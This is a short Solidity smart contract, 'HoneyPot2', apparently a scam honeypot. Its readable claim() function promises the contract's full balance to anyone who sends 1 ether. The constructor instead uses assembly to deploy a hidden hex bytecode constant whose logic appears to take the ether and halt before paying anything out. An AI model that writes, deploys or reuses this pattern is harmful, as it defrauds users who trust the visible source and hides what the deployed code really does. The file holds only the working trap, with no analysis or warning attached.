pragma solidity ^0.4.23;

contract HoneyPot2 {
    
    bytes public constant cd = hex"608060405260043610603e5763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416634e71d92d81146043575b600080fd5b6049604b565b005b670de0b6b3a7640000341015605f57600080fd5b00405173ffffffffffffffffffffffffffffffffffffffff33811691309091163180156108fc02916000818181858888f1935050505015801560a5573d6000803e3d6000fd5b505600a165627a7a72305820323d22020f2842db4c2093a629778247493ed165db98c15502c3158dfa4614860029";
    
    constructor () public payable {
        bytes memory bts = cd;
        assembly {
            return(add(0x20, bts), mload(bts))
        }
    }
    
    function claim() public payable {
        require(msg.value >= 1 ether);
        msg.sender.transfer(address(this).balance);
    }
}